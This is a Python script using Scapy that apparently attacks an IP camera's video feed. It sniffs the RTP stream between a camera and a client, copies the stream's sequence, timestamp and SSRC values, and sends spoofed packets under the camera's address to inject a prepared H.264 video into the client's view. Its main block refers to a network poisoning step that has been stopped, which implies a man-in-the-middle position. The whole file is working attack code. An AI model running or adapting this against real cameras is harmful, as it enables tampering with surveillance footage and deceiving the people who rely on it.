from scapy.all import IP, UDP, RTP, Raw, send, sniff
import time
import struct



IFACE = "en0"                 
IP_CAMERA = "192.168.0.81"    
IP_CLIENT = "192.168.0.162"    


RTP_PORT_CAMERA = 47188        
RTP_PORT_CLIENT = 63934        
SSRC_INJECTED = 0x3344456e 
INIT_SEQ_NUM = 63575           

PAYLOAD_TYPE = 96              
TIMESTAMP_RATE = 90000        
FRAME_RATE = 25               
TIME_PER_FRAME = 1.0 / FRAME_RATE


def packetize_nal_unit(nal_unit, mtu=1400):
    # If it fits in one packet, return it as is
    if len(nal_unit) <= mtu:
        return [nal_unit]
    

    nal_header = nal_unit[0]
    nri = nal_header & 0x60      # Importance bits
    nal_type = nal_header & 0x1F # Original NAL type
    
    # Payload is everything after the first byte
    payload = nal_unit[1:]
    
    fragments = []
    
    #Fu Indicator byte which is the first byte of the Fu header
    fu_indicator = nri | 28
    
    offset = 0
    while offset < len(payload):
        # Determine chunk size (MTU minus 2 bytes for FU headers which are 2 bytes  )
        available_space = mtu - 2 
        chunk_size = min(available_space, len(payload) - offset)
        chunk = payload[offset : offset + chunk_size]
        
        # Create FU Header byte: S | E | R | Type
        s_bit = 1 if offset == 0 else 0                       # Start bit
        e_bit = 1 if (offset + chunk_size) == len(payload) else 0 # End bit
        r_bit = 0                                             # Reserved bit
        
        fu_header = (s_bit << 7) | (e_bit << 6) | (r_bit << 5) | nal_type
        
        # Combine Indicator + Header + Payload Chunk
        packet_payload = bytes([fu_indicator, fu_header]) + chunk
        fragments.append(packet_payload)
        
        offset += chunk_size
        
    return fragments

def get_stream_params():
    print(f"[*] Sniffing for 1 valid RTP VIDEO packet (PT>=96) on {IFACE}...")
    
    # We loop until we find a VIDEO packet (PT >= 96) so we dont get any audio packets
    # AND ensuring packet size is > 300 bytes , safe check to avoid getting audio packets
    while True:
        packets = sniff(count=1, filter=f"udp and src {IP_CAMERA} and dst {IP_CLIENT} and len > 300", iface=IFACE, timeout=5)
        
        if not packets:
            print("[-] Timeout waiting for large video packet. Retrying...")
            continue
            
        pkt = packets[0]
        pt = 0
        
        # extract the payload type to check if it's video
        if RTP in pkt:
            pt = pkt[RTP].payload_type
        else:
            try:
                udp_payload = bytes(pkt[UDP].payload)
                if len(udp_payload) >= 12:
                    header = struct.unpack("!HHII", udp_payload[:12])
                    pt = (header[0] & 0xFF) & 0x7F
            except:
                continue

        # Check if it's likely video (Dynamic RTP types are 96-127)
        if pt >= 96:
             # if it is then we extract the full details
             if RTP in pkt:
                rtp = pkt[RTP]
                print(f"[+] Synced to VIDEO! Seq={rtp.sequence}, TS={rtp.timestamp}, SSRC={hex(rtp.sourcesync)}, PT={rtp.payload_type}")
                return rtp.sequence + 1, rtp.timestamp + 3600, rtp.sourcesync, rtp.payload_type, pkt[UDP].sport, pkt[UDP].dport
             else:
                # manual extraction again for the valid packet which is not an RTP packet
                udp_payload = bytes(pkt[UDP].payload)
                header = struct.unpack("!HHII", udp_payload[:12])
                seq = header[1]
                ts = header[2]
                ssrc = header[3]
                print(f"[+] Synced to VIDEO (Manual)! Seq={seq}, TS={ts}, SSRC={hex(ssrc)}, PT={pt}")
                return seq + 1, ts + 3600, ssrc, pt, pkt[UDP].sport, pkt[UDP].dport
        else:
             print(f"[*] Ignored Audio/Control packet (PT={pt})... waiting for Video.")

    print("[-] Could not parse RTP. Using defaults.")
    return INIT_SEQ_NUM, 0, SSRC_INJECTED, PAYLOAD_TYPE, RTP_PORT_CAMERA, RTP_PORT_CLIENT


def inject_stream(h264_file):
    # auto-sync parameters so that we can inject the stream correctly
    sequence_num, timestamp, ssrc, payload_type, sport, dport = get_stream_params()
    
    print(f"[*] Starting stream injection on {IFACE} -> SrcPort:{sport} DstPort:{dport}...")
    
    try:
        with open(h264_file, 'rb') as f:
            raw_h264_data = f.read()

        # The raw file contains NAL units separated by start codes (00 00 00 01 or 00 00 01)
        # We split the data by the 4-byte start code (00 00 00 01) but we ignore the first element, which is empty due to leading start code.
        nal_units = raw_h264_data.split(b'\x00\x00\x00\x01')[1:]

        # Check for 3-byte start code as well, simple way to break the file into NALs if the 4-byte start code is not found
        if not nal_units:
            nal_units = raw_h264_data.split(b'\x00\x00\x01')[1:]

        if not nal_units:
            print("[-] Error: Could not find H.264 NAL units. Check FFmpeg conversion.")
            return

        print(f"[*] Found {len(nal_units)} NAL units to inject.")
        start_time = time.time()

        for nal_unit in nal_units:
            # if the NAL unit is too large for IP even after fragmentation, we skip it
            if len(nal_unit) > 200000: 
                print(f"Skipping extremely large NAL unit ({len(nal_unit)})")
                continue

            # split the NAL unit into valid RTP payloads (fragments if needed)
            rtp_payloads = packetize_nal_unit(nal_unit)
            
            # Use current timestamp for all fragments of this NAL unit
            current_timestamp = timestamp 
            
            for i, payload in enumerate(rtp_payloads):
                # Marker bit is set only on the LAST packet of the NAL unit
                is_last_fragment = (i == len(rtp_payloads) - 1)
                
                # --- Build the packet ---
                packet = IP(src=IP_CAMERA, dst=IP_CLIENT) / \
                         UDP(sport=sport, dport=dport) / \
                         RTP(
                             version=2,
                             payload_type=payload_type,
                             sequence=sequence_num,
                             timestamp=current_timestamp,
                             sourcesync=ssrc, 
                             marker=1 if is_last_fragment else 0 
                         ) / Raw(load=payload)

                # Remove checksums to force Scapy to recalculate
                del packet[IP].chksum
                del packet[UDP].chksum
                
                # Send directly (no 'fragment' call needed, we did it manually)
                send(packet, iface=IFACE, verbose=False)
                
                # Increment sequence number safely
                sequence_num = (sequence_num + 1) % 65536
                
                # Burst mode: No sleep between fragments of the same frame!
                # We want the whole frame to arrive ASAP.

            # Increment timestamp for every NAL unit
            timestamp = (timestamp + 3600) % 4294967296 
            
            # Wait for the next frame time (approx 1/30 or 1/25 sec)
            # Adjust this to match the framerate of your video
            time.sleep(0.03) 

    except Exception as e:
        print(f"Injection failed: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("\n[*] Injection loop finished.")


if __name__ == "__main__":
    
   
    print("\nstop posioning the camera and client to stop the stream")
    input("Press Enter to continue the Injection...")


    print("Injecting stream...")
    inject_stream("raw.h264")
    print("Injected")

    print("\ncleanup the network")
